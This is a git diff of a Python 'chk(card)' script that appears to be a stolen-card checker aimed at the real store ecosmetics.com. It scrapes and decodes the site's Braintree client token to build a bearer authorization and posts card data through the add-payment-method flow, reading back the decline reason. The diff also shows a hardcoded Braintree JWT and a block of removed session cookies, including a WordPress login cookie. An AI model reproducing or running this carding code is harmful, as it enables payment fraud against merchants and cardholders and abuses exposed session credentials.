@@ -204,7 +204,13 @@ def chk(card):
 }
 
 	response = requests.get('https://www.ecosmetics.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
+	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
 
+	dec = base64.b64decode(enc).decode('utf-8')
+
+	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
+	
+	
 
 	
 	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
@@ -218,7 +224,7 @@ def chk(card):
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjQ1NTA2ODAsImp0aSI6ImI3MWVkMjAzLThjZmYtNGUzMS1iYmIzLTMwNzc2MzU4NTIyMCIsInN1YiI6IjdkZmI4NjdkaDluN3FjbXEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjdkZmI4NjdkaDluN3FjbXEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiZWNvc21ldGljc19pbnN0YW50In19.PY2cNR1VDpVYmdUPvS2PSUO0lzvs0_gwNTbZCEjsbouJBUHZ3LFhKcTJlxu-NcoWuvEhlxzX50JN0RqmTF5wdQ',
+    'authorization': f'Bearer {au}',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -273,30 +279,6 @@ def chk(card):
 #7
 
 
-	cookies = {
-    '_gcl_au': '1.1.2031979683.1724177258',
-    'cf_clearance': 'qofT0FFOQh4RG5iihHgxrqmlZQj2G_Ix38WxIXO5CII-1724177257-1.2.1.1-HtCeoDfoCiQGL3APGIrmNZNyAQG8zSvPnN6V8I0E9NYIbyziKIlkgevmTPLG3h64iU3nqOo2l4LK6kJhvXvKZ1GAcKBXti5jTw8eTP.bwSAtHIhyfkxt2Iih0LAz3w6l0TT3XDBsR0T2HNKSNkQQI5dF0zvFvxu4poWWTqEdD8pNSNV_Y5PP40u43WGw6YW7PmssSEcY_pA6uyH12PLHCNPliO6mZfUi5zytI_lVfda1lRNA7W3_AQC6iUkTarBjs6FiFAlOYQps2SpMrAA8jLtDPPbVtIpW9BJoQuG0BXrcTeZzPXAw_V0UmweXzh9U__POSMQONzBVOADsIONMd3Dh.CQFbBBQNhJmPASe8zRL6SoLmOtYsbvNhpdHm4Eh0rwsUDSv3vNUk1sMyBF39rixsuV9IqOyoGlfX7qIbZjaLbkoAvzD8CHL_nRcRndX',
-    '_ga': 'GA1.1.1649746425.1724177258',
-    'wordpress_logged_in_9a1daefe07e3d628d7e9f4ff0d3f8220': 'hfujfhfidjfjjfjjf%7C1725387784%7CR5MmdxnX19Nc4XJaJeSkPQa3S1lPFAk7rcWO65ydsW7%7C4a304a39752a0f2bf0681cb00cd293d378eaff830248234708daa453401de1ec',
-    'wp_woocommerce_session_9a1daefe07e3d628d7e9f4ff0d3f8220': '9328496%7C%7C1724350782%7C%7C1724347182%7C%7C8c291e07735d9441d93056d27be732af',
-    'PHPSESSID': '%2CiuSWpsVx0pHDUG95xfuZrbUWWYHGUJD',
-    '__cf_bm': '6jzB6W7P0TTsIUB7S0qonpXSlyI6MQaAWe5CTPn8KZ8-1724179106-1.0.1.1-OAr04jrC1tK5huKgAwGRk31eeKi8Vaf8fNAZ1fICovP9gBC_c3PrrZLBQnatLFiERgZC.KJ.ofqQb8HOBPbPNw',
-    '_cfuvid': '2nhlIBbkQHz3FArNTbQhoUMeqUmKChU8eKqgVwvtfb0-1724179106026-0.0.1.1-604800000',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-08-20%2018%3A38%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
-    'sbjs_first_add': 'fd%3D2024-08-20%2018%3A38%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'pmTPTrack': '%7B%22gclid%22%3Anull%2C%22gacid%22%3A%22GA1.1.1649746425.1724177258%22%2C%22gacid_source%22%3A%22gacookie%22%2C%22fbp%22%3Anull%2C%22fbc%22%3Anull%2C%22gbraid%22%3Anull%2C%22wbraid%22%3Anull%2C%22ga4SessionId%22%3A%221724177258%22%2C%22ga4SessionCount%22%3A%221%22%2C%22timestamp%22%3A1724179235%7D',
-    'sbjs_session': 'pgs%3D15%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fadd-payment-method%2F',
-    '_uetsid': '1645f3a05f1f11efb80797a9ddcabe8c',
-    '_uetvid': '164771105f1f11ef9cdf6922044cec24',
-    '_ga_S104KL6WC3': 'GS1.1.1724177258.1.1.1724179440.0.0.0',
-    '_ga_4Z6R75ENPP': 'GS1.1.1724177259.1.1.1724179441.0.0.0',
-    '_ga_S84EZBZ2FR': 'GS1.1.1724177259.1.1.1724179441.60.0.1246504398',
-}
-
 	headers = {
     'authority': 'www.ecosmetics.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -329,7 +311,7 @@ def chk(card):
     'woocommerce_add_payment_method': '1',
 }
 
-	response = requests.post('https://www.ecosmetics.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+	response = requests.post('https://www.ecosmetics.com/my-account/add-payment-method/', cookies=r.cookies,headers=headers, data=data)
 
 	pattern = r'Reason: (.*?)\s*</li>'
     
